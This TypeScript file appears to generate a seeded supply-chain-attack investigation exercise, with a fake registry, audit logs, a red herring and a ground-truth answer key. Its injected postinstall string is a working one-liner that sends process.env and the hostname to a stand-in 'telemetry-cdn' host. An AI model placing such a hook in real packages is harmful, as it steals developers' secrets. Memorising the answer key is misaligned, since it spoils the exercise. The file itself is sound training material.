/**
 * The Phantom Registry — Data Generator
 *
 * Generates a seeded scenario where a phantom maintainer has infiltrated a
 * package registry, taking over legitimate maintainer accounts and injecting
 * malicious postinstall hooks into popular packages.
 *
 * Each seed produces a unique registry with 40 packages, 15 maintainers,
 * 3 compromised packages, and a fully reconstructable attack timeline.
 */

// ── Seeded PRNG (mulberry32) ─────────────────────────────────────────

function rng(seed: number): () => number {
  let s = seed | 0;
  return () => {
    s = (s + 0x6d2b79f5) | 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick<T>(arr: readonly T[], r: () => number): T {
  return arr[Math.floor(r() * arr.length)];
}

function pickN<T>(arr: readonly T[], n: number, r: () => number): T[] {
  const pool = [...arr];
  const out: T[] = [];
  for (let i = 0; i < Math.min(n, pool.length); i++) {
    const idx = Math.floor(r() * (pool.length - i));
    out.push(pool[idx]);
    pool.splice(idx, 1);
  }
  return out;
}

function randInt(min: number, max: number, r: () => number): number {
  return min + Math.floor(r() * (max - min + 1));
}

function shuffle<T>(arr: T[], r: () => number): T[] {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(r() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

// ── Name pools ───────────────────────────────────────────────────────

const PACKAGE_PREFIXES = [
  "reef", "coral", "tide", "wave", "kelp", "shell", "pearl", "anchor",
  "drift", "foam", "surge", "deep", "brine", "salt", "fin", "gill",
  "scale", "hull", "mast", "keel", "stern", "bow", "plank", "rivet",
  "bolt", "chain", "rope", "net", "hook", "lure", "cast", "reel",
  "spool", "knot", "splice", "weave", "braid", "twine", "yarn", "fiber",
];

const PACKAGE_SUFFIXES = [
  "utils", "core", "lib", "io", "db", "cache", "queue", "log",
  "auth", "config", "fmt", "parse", "codec", "net", "http", "rpc",
  "cli", "test", "lint", "build", "pack", "bundle", "serve", "watch",
  "sync", "pipe", "flow", "stream", "pool", "guard", "proxy", "relay",
  "bridge", "gate", "port", "hub", "node", "link", "mesh", "grid",
];

const FIRST_NAMES = [
  "Ada", "Grace", "Alan", "Linus", "Guido", "Bjarne", "Dennis", "Ken",
  "Margaret", "Barbara", "Fran", "Hedy", "Radia", "Anita", "Katherine", "Joan",
];

const LAST_NAMES = [
  "Lovelace", "Hopper", "Turing", "Torvalds", "Rossum", "Stroustrup", "Ritchie", "Thompson",
  "Hamilton", "Liskov", "Allen", "Lamarr", "Perlman", "Borg", "Johnson", "Clarke",
];

const HANDLE_ADJECTIVES = [
  "swift", "clever", "rusty", "salty", "misty", "fuzzy", "lucky", "dusty",
  "rocky", "sandy", "stormy", "sunny", "frosty", "crispy", "curly", "dizzy",
];

const HANDLE_NOUNS = [
  "crab", "lobster", "squid", "octopus", "eel", "ray", "shark", "whale",
  "turtle", "seal", "otter", "pelican", "gull", "heron", "plover", "tern",
];

// ── Scenario types ───────────────────────────────────────────────────

const ATTACK_VECTORS = [
  {
    id: "credential_phishing",
    label: "Credential Phishing",
    description: "Phantom sent fake security alerts to a maintainer, stealing their API token via a cloned login page",
    signals: ["LOGIN_FROM_NEW_IP", "API_TOKEN_REGENERATED", "RAPID_PUBLISH_AFTER_TOKEN_CHANGE"],
  },
  {
    id: "typosquat_takeover",
    label: "Typosquat + Account Takeover",
    description: "Phantom registered near-identical packages, gained trust as contributor, then requested maintainer access",
    signals: ["SIMILAR_PACKAGE_REGISTERED", "CONTRIBUTOR_ELEVATED", "MAINTAINER_ADDED_BY_SOCIAL_ENGINEERING"],
  },
  {
    id: "abandoned_package_takeover",
    label: "Abandoned Package Takeover",
    description: "Phantom took over unmaintained but widely-depended-on packages through the registry's adoption process",
    signals: ["OWNERSHIP_TRANSFER_REQUEST", "PACKAGE_DORMANT_THEN_ACTIVE", "BULK_VERSION_PUBLISH"],
  },
  {
    id: "build_script_injection",
    label: "Build Script Injection via PR",
    description: "Phantom submitted PRs with benign code changes that hid malicious postinstall scripts in package.json",
    signals: ["PR_MERGED_WITH_SCRIPT_CHANGE", "POSTINSTALL_ADDED", "OBFUSCATED_SCRIPT_CONTENT"],
  },
] as const;

const MALICIOUS_PAYLOADS = [
  { type: "env_exfiltration", indicator: "process.env collected and sent to external endpoint", signal: "OUTBOUND_DATA_TO_UNKNOWN_HOST" },
  { type: "ssh_key_theft", indicator: "~/.ssh/ directory read and exfiltrated", signal: "SSH_KEY_ACCESS_ATTEMPT" },
  { type: "token_harvesting", indicator: "CI/CD tokens and npm credentials read from config files", signal: "CREDENTIAL_FILE_READ" },
  { type: "backdoor_install", indicator: "Persistent reverse shell installed via cron job", signal: "CRON_MODIFICATION_DETECTED" },
];

// ── Data generator ───────────────────────────────────────────────────

export interface PhantomRegistryData {
  objective: string;
  groundTruth: {
    phantomHandle: string;
    attackVector: string;
    compromisedPackages: Array<{
      name: string;
      compromisedVersion: string;
      maliciousPayload: string;
      affectedDownloads: number;
    }>;
    attackTimeline: Array<{
      timestamp: string;
      event: string;
      evidence: string;
    }>;
    compromisedMaintainer: string;
    redHerring: {
      handle: string;
      reason: string;
    };
  };
  packages: unknown[];
  maintainers: unknown[];
  auditLogs: unknown[];
  downloadStats: unknown[];
  triageContext: unknown;
}

export function generatePhantomRegistryData(seed: number): PhantomRegistryData {
  const r = rng(seed);

  // ── Generate maintainers ────────────────────────────────────────────
  const maintainerCount = 15;
  const maintainers: Array<{
    handle: string;
    name: string;
    email: string;
    joinedAt: string;
    lastActive: string;
    packages: string[];
    loginIPs: string[];
    twoFactorEnabled: boolean;
  }> = [];

  const usedHandles = new Set<string>();
  for (let i = 0; i < maintainerCount; i++) {
    let handle: string;
    do {
      handle = pick(HANDLE_ADJECTIVES, r) + "-" + pick(HANDLE_NOUNS, r);
    } while (usedHandles.has(handle));
    usedHandles.add(handle);

    const firstName = pick(FIRST_NAMES, r);
    const lastName = pick(LAST_NAMES, r);
    const joinDaysAgo = randInt(180, 1200, r);
    const activeDaysAgo = randInt(0, 30, r);

    const ip1 = `${randInt(50, 200, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}`;
    const ip2 = `${randInt(50, 200, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}`;

    maintainers.push({
      handle,
      name: `${firstName} ${lastName}`,
      email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}@example.com`,
      joinedAt: daysAgo(joinDaysAgo),
      lastActive: daysAgo(activeDaysAgo),
      packages: [],
      loginIPs: [ip1, ip2],
      twoFactorEnabled: r() > 0.3,
    });
  }

  // ── Generate packages ───────────────────────────────────────────────
  const packageCount = 40;
  const packages: Array<{
    name: string;
    description: string;
    currentVersion: string;
    versions: Array<{
      version: string;
      publishedAt: string;
      publishedBy: string;
      hasPostinstall: boolean;
      postinstallContent?: string;
      checksumSha256: string;
      size: number;
    }>;
    maintainers: string[];
    weeklyDownloads: number;
    dependents: number;
    createdAt: string;
    keywords: string[];
  }> = [];

  const usedNames = new Set<string>();
  const prefixes = shuffle([...PACKAGE_PREFIXES], r);
  const suffixes = shuffle([...PACKAGE_SUFFIXES], r);

  for (let i = 0; i < packageCount; i++) {
    let name: string;
    do {
      name = prefixes[i % prefixes.length] + "-" + suffixes[i % suffixes.length];
    } while (usedNames.has(name));
    usedNames.add(name);

    const maintainerIdx = i % maintainerCount;
    const secondMaintainer = (i + 3) % maintainerCount;
    const pkgMaintainers = maintainerIdx === secondMaintainer
      ? [maintainers[maintainerIdx].handle]
      : [maintainers[maintainerIdx].handle, maintainers[secondMaintainer].handle];

    for (const mh of pkgMaintainers) {
      const m = maintainers.find(m => m.handle === mh);
      if (m && !m.packages.includes(name)) m.packages.push(name);
    }

    const versionCount = randInt(3, 12, r);
    const versions: typeof packages[number]["versions"] = [];
    let major = 1, minor = 0, patch = 0;
    const createdDaysAgo = randInt(90, 800, r);

    for (let v = 0; v < versionCount; v++) {
      if (r() > 0.7) major++;
      else if (r() > 0.5) minor++;
      else patch++;

      const vDaysAgo = Math.max(0, createdDaysAgo - Math.floor((createdDaysAgo / versionCount) * v));
      const checksumHex = Array.from({ length: 64 }, () =>
        "0123456789abcdef"[Math.floor(r() * 16)]
      ).join("");

      versions.push({
        version: `${major}.${minor}.${patch}`,
        publishedAt: daysAgo(vDaysAgo),
        publishedBy: pick(pkgMaintainers, r),
        hasPostinstall: false,
        checksumSha256: checksumHex,
        size: randInt(5000, 500000, r),
      });
    }

    packages.push({
      name,
      description: `${pick(["High-performance", "Lightweight", "Production-ready", "Battle-tested", "Zero-dependency"], r)} ${pick(["utility", "library", "framework", "toolkit", "module"], r)} for ${pick(["data processing", "stream handling", "network I/O", "serialization", "caching", "authentication", "logging", "configuration"], r)}`,
      currentVersion: versions[versions.length - 1].version,
      versions,
      maintainers: pkgMaintainers,
      weeklyDownloads: randInt(100, 500000, r),
      dependents: randInt(0, 2000, r),
      createdAt: daysAgo(createdDaysAgo),
      keywords: pickN(["async", "stream", "buffer", "crypto", "json", "yaml", "sql", "http", "tcp", "udp", "cache", "queue"], randInt(2, 4, r), r),
    });
  }

  // ── Select attack scenario ──────────────────────────────────────────
  const attackVector = pick(ATTACK_VECTORS, r);
  const payload = pick(MALICIOUS_PAYLOADS, r);

  // ── Create the phantom ──────────────────────────────────────────────
  let phantomHandle: string;
  do {
    phantomHandle = pick(HANDLE_ADJECTIVES, r) + "-" + pick(HANDLE_NOUNS, r);
  } while (usedHandles.has(phantomHandle));

  const phantomJoinedDaysAgo = randInt(45, 90, r);
  const phantomIP = `${randInt(180, 220, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}.${randInt(1, 254, r)}`;

  maintainers.push({
    handle: phantomHandle,
    name: pick(FIRST_NAMES, r) + " " + pick(LAST_NAMES, r),
    email: `${phantomHandle}@proton.me`,
    joinedAt: daysAgo(phantomJoinedDaysAgo),
    lastActive: daysAgo(randInt(1, 5, r)),
    packages: [],
    loginIPs: [phantomIP],
    twoFactorEnabled: true,
  });

  // ── Select compromised maintainer and packages ──────────────────────
  // Pick a maintainer with 2+ packages who has 2FA disabled (more plausible victim)
  const vulnerableMaintainers = maintainers.filter(
    m => m.packages.length >= 2 && !m.twoFactorEnabled && m.handle !== phantomHandle
  );
  const compromisedMaintainer = vulnerableMaintainers.length > 0
    ? pick(vulnerableMaintainers, r)
    : maintainers.find(m => m.handle !== phantomHandle && m.packages.length >= 2)!;

  // Pick 3 packages: 2 from compromised maintainer, 1 high-download target
  const compromisedMaintainerPkgs = packages.filter(p =>
    p.maintainers.includes(compromisedMaintainer.handle)
  );
  const targetPkgs = compromisedMaintainerPkgs.length >= 2
    ? pickN(compromisedMaintainerPkgs, 2, r)
    : [compromisedMaintainerPkgs[0], pick(packages.filter(p => !compromisedMaintainerPkgs.includes(p)), r)];

  // Third package: high-download target from another maintainer
  const otherHighDownload = packages
    .filter(p => !targetPkgs.includes(p) && p.weeklyDownloads > 50000)
    .sort((a, b) => b.weeklyDownloads - a.weeklyDownloads);
  if (otherHighDownload.length > 0) {
    targetPkgs.push(pick(otherHighDownload.slice(0, 5), r));
  } else {
    const remaining = packages.filter(p => !targetPkgs.includes(p));
    targetPkgs.push(pick(remaining, r));
  }

  // Add phantom as maintainer on third package
  targetPkgs[2].maintainers.push(phantomHandle);
  const phantomMaintainer = maintainers.find(m => m.handle === phantomHandle)!;
  phantomMaintainer.packages.push(targetPkgs[2].name);

  // ── Inject malicious versions ───────────────────────────────────────
  const compromisedPackages: PhantomRegistryData["groundTruth"]["compromisedPackages"] = [];
  const attackTimeline: PhantomRegistryData["groundTruth"]["attackTimeline"] = [];
  const attackStartDaysAgo = randInt(12, 25, r);

  for (let pi = 0; pi < targetPkgs.length; pi++) {
    const pkg = targetPkgs[pi];
    const lastVersion = pkg.versions[pkg.versions.length - 1];
    const [major, minor, patch] = lastVersion.version.split(".").map(Number);
    const maliciousVersion = `${major}.${minor}.${patch + 1}`;
    const publishDaysAgo = attackStartDaysAgo - (pi * randInt(2, 5, r));

    const maliciousChecksum = Array.from({ length: 64 }, () =>
      "0123456789abcdef"[Math.floor(r() * 16)]
    ).join("");

    const postinstallScript = `node -e "var h=require('http'),c=require('child_process');` +
      `var d={e:process.env,h:require('os').hostname()};` +
      `var r=h.request({hostname:'telemetry-cdn.${pick(["io", "dev", "sh"], r)}',` +
      `port:443,path:'/collect',method:'POST'},function(){});` +
      `r.write(JSON.stringify(d));r.end()"`;

    pkg.versions.push({
      version: maliciousVersion,
      publishedAt: daysAgo(publishDaysAgo),
      publishedBy: pi < 2 ? compromisedMaintainer.handle : phantomHandle,
      hasPostinstall: true,
      postinstallContent: postinstallScript,
      checksumSha256: maliciousChecksum,
      size: lastVersion.size + randInt(200, 800, r),
    });
    pkg.currentVersion = maliciousVersion;

    const affectedDownloads = Math.floor(pkg.weeklyDownloads * (publishDaysAgo / 7) * (r() * 0.3 + 0.5));

    compromisedPackages.push({
      name: pkg.name,
      compromisedVersion: maliciousVersion,
      maliciousPayload: payload.type,
      affectedDownloads,
    });

    attackTimeline.push({
      timestamp: daysAgo(publishDaysAgo),
      event: `Malicious version ${maliciousVersion} published to ${pkg.name}`,
      evidence: `Published by ${pi < 2 ? compromisedMaintainer.handle : phantomHandle}, contains postinstall script with outbound HTTP to external host`,
    });
  }

  // Add pre-attack timeline events
  attackTimeline.unshift(
    {
      timestamp: daysAgo(attackStartDaysAgo + 5),
      event: `Phantom account ${phantomHandle} created`,
      evidence: `New account with proton.me email, single login IP`,
    },
    {
      timestamp: daysAgo(attackStartDaysAgo + 2),
      event: `${compromisedMaintainer.handle} API token compromised via ${attackVector.label}`,
      evidence: attackVector.signals.join(", "),
    },
    {
      timestamp: daysAgo(attackStartDaysAgo + 1),
      event: `${phantomHandle} added as maintainer to ${targetPkgs[2].name}`,
      evidence: `MAINTAINER_ADDED event in audit log, authorized by compromised token`,
    },
  );
  attackTimeline.sort((a, b) => a.timestamp.localeCompare(b.timestamp));

  // ── Generate audit logs ─────────────────────────────────────────────
  const auditLogs = generateAuditLogs(
    r, maintainers, packages, phantomHandle,
    compromisedMaintainer.handle, targetPkgs, attackVector, attackStartDaysAgo,
  );

  // ── Generate download stats ─────────────────────────────────────────
  const downloadStats = packages.map(pkg => {
    const days = 30;
    const daily: Array<{ date: string; downloads: number }> = [];
    const baseDaily = Math.floor(pkg.weeklyDownloads / 7);

    for (let d = days; d >= 0; d--) {
      const noise = 1 + (r() * 0.4 - 0.2);
      let downloads = Math.floor(baseDaily * noise);

      // Compromised packages show a download spike then gradual decline
      const isCompromised = compromisedPackages.some(cp => cp.name === pkg.name);
      if (isCompromised && d < attackStartDaysAgo && d > attackStartDaysAgo - 10) {
        downloads = Math.floor(downloads * (1 + r() * 0.5));
      }

      daily.push({ date: daysAgo(d).split("T")[0], downloads });
    }

    return { package: pkg.name, daily };
  });

  // ── Select red herring ──────────────────────────────────────────────
  // A maintainer who looks suspicious but is innocent
  const redHerringCandidates = maintainers.filter(
    m => m.handle !== phantomHandle &&
    m.handle !== compromisedMaintainer.handle &&
    m.packages.length >= 2
  );
  const redHerringMaintainer = pick(redHerringCandidates, r);

  // Make the red herring look suspicious: recent account, published recent versions
  redHerringMaintainer.joinedAt = daysAgo(randInt(30, 60, r));
  const rhPkg = packages.find(p => p.maintainers.includes(redHerringMaintainer.handle));
  if (rhPkg) {
    const lastV = rhPkg.versions[rhPkg.versions.length - 1];
    const [maj, min, pat] = lastV.version.split(".").map(Number);
    rhPkg.versions.push({
      version: `${maj}.${min}.${pat + 1}`,
      publishedAt: daysAgo(randInt(3, 8, r)),
      publishedBy: redHerringMaintainer.handle,
      hasPostinstall: false,
      checksumSha256: Array.from({ length: 64 }, () => "0123456789abcdef"[Math.floor(r() * 16)]).join(""),
      size: lastV.size + randInt(100, 500, r),
    });
  }

  // ── Triage context ──────────────────────────────────────────────────
  const triageContext = {
    alert_source: "Automated Security Scanner",
    alert_time: daysAgo(0),
    severity: "P1",
    summary: "Anomalous postinstall scripts detected in recently published package versions. Potential supply chain compromise.",
    affected_scope: "Unknown — investigation required",
    initial_indicators: [
      `${compromisedPackages.length} packages flagged with suspicious postinstall scripts`,
      "Outbound HTTP requests to unrecognized domains during package installation",
      "Version checksums differ from source repository builds",
    ],
    registry_stats: {
      total_packages: packages.length,
      total_maintainers: maintainers.length,
      flagged_packages: compromisedPackages.length,
    },
  };

  return {
    objective: "Investigate a supply chain attack on a package registry. Identify the phantom maintainer, the attack vector, all compromised packages, and reconstruct the attack timeline.",
    groundTruth: {
      phantomHandle,
      attackVector: attackVector.id,
      compromisedPackages,
      attackTimeline,
      compromisedMaintainer: compromisedMaintainer.handle,
      redHerring: {
        handle: redHerringMaintainer.handle,
        reason: "Recently joined and published updates, but no malicious postinstall scripts in any published version",
      },
    },
    packages,
    maintainers,
    auditLogs,
    downloadStats,
    triageContext,
  };
}

// ── Audit log generator ──────────────────────────────────────────────

function generateAuditLogs(
  r: () => number,
  maintainers: PhantomRegistryData["maintainers"],
  packages: PhantomRegistryData["packages"],
  phantomHandle: string,
  compromisedHandle: string,
  targetPkgs: Array<{ name: string; versions: Array<{ version: string; publishedAt: string; publishedBy: string }> }>,
  attackVector: typeof ATTACK_VECTORS[number],
  attackStartDaysAgo: number,
): unknown[] {
  const logs: Array<{
    id: string;
    timestamp: string;
    actor: string;
    action: string;
    target: string;
    details: string;
    ip: string;
    success: boolean;
  }> = [];

  let logId = 1;
  const mArr = maintainers as Array<{ handle: string; loginIPs: string[] }>;
  const pArr = packages as Array<{ name: string; versions: Array<{ version: string; publishedAt: string; publishedBy: string }> }>;

  // Normal background activity: logins, publishes, package views
  for (let d = 60; d >= 0; d--) {
    const eventsPerDay = randInt(8, 20, r);
    for (let e = 0; e < eventsPerDay; e++) {
      const m = pick(mArr.filter(m => m.handle !== phantomHandle), r);
      const hour = randInt(8, 22, r);
      const minute = randInt(0, 59, r);

      const actions = ["login", "package.view", "package.download", "profile.update", "token.list"];
      const action = pick(actions, r);

      logs.push({
        id: `audit-${String(logId++).padStart(6, "0")}`,
        timestamp: daysAgoWithTime(d, hour, minute),
        actor: m.handle,
        action,
        target: action.startsWith("package") ? pick(pArr, r).name : m.handle,
        details: action === "login" ? "Successful authentication" : `${action} operation`,
        ip: pick(m.loginIPs, r),
        success: true,
      });
    }
  }

  // Version publish events (normal)
  for (const pkg of pArr) {
    for (const ver of pkg.versions) {
      if (ver.publishedBy === phantomHandle) continue;
      logs.push({
        id: `audit-${String(logId++).padStart(6, "0")}`,
        timestamp: ver.publishedAt,
        actor: ver.publishedBy,
        action: "package.publish",
        target: `${pkg.name}@${ver.version}`,
        details: `Published version ${ver.version}`,
        ip: pick((mArr.find(m => m.handle === ver.publishedBy) || mArr[0]).loginIPs, r),
        success: true,
      });
    }
  }

  // ── Attack-specific audit events ────────────────────────────────────

  const phantomIP = (mArr.find(m => m.handle === phantomHandle) || mArr[0]).loginIPs[0];

  // Phantom account creation
  logs.push({
    id: `audit-${String(logId++).padStart(6, "0")}`,
    timestamp: daysAgoWithTime(attackStartDaysAgo + 5, 3, randInt(0, 59, r)),
    actor: "system",
    action: "account.create",
    target: phantomHandle,
    details: `New account registered: ${phantomHandle}`,
    ip: phantomIP,
    success: true,
  });

  // Attack vector signals
  for (const signal of attackVector.signals) {
    logs.push({
      id: `audit-${String(logId++).padStart(6, "0")}`,
      timestamp: daysAgoWithTime(attackStartDaysAgo + 2, randInt(1, 5, r), randInt(0, 59, r)),
      actor: compromisedHandle,
      action: `security.${signal.toLowerCase()}`,
      target: compromisedHandle,
      details: signal.replace(/_/g, " "),
      ip: phantomIP, // Key evidence: compromised maintainer actions from phantom's IP
      success: true,
    });
  }

  // Phantom added as maintainer
  logs.push({
    id: `audit-${String(logId++).padStart(6, "0")}`,
    timestamp: daysAgoWithTime(attackStartDaysAgo + 1, 4, randInt(0, 59, r)),
    actor: compromisedHandle,
    action: "package.maintainer.add",
    target: targetPkgs[2].name,
    details: `Added ${phantomHandle} as maintainer`,
    ip: phantomIP,
    success: true,
  });

  // Failed login attempts by phantom (probing)
  for (let i = 0; i < 3; i++) {
    logs.push({
      id: `audit-${String(logId++).padStart(6, "0")}`,
      timestamp: daysAgoWithTime(attackStartDaysAgo + 3, randInt(0, 6, r), randInt(0, 59, r)),
      actor: compromisedHandle,
      action: "login",
      target: compromisedHandle,
      details: "Failed authentication attempt",
      ip: phantomIP,
      success: false,
    });
  }

  // Malicious publishes
  for (const pkg of targetPkgs) {
    const malVer = pkg.versions[pkg.versions.length - 1];
    logs.push({
      id: `audit-${String(logId++).padStart(6, "0")}`,
      timestamp: malVer.publishedAt,
      actor: malVer.publishedBy,
      action: "package.publish",
      target: `${pkg.name}@${malVer.version}`,
      details: `Published version ${malVer.version} with postinstall script`,
      ip: phantomIP,
      success: true,
    });
  }

  // Sort by timestamp
  logs.sort((a, b) => a.timestamp.localeCompare(b.timestamp));

  return logs;
}

// ── Helpers ───────────────────────────────────────────────────────────

function daysAgo(d: number): string {
  const now = new Date("2026-03-01T12:00:00Z");
  const then = new Date(now.getTime() - d * 86400000);
  return then.toISOString();
}

function daysAgoWithTime(d: number, hour: number, minute: number): string {
  const now = new Date("2026-03-01T12:00:00Z");
  const then = new Date(now.getTime() - d * 86400000);
  then.setUTCHours(hour, minute, 0, 0);
  return then.toISOString();
}
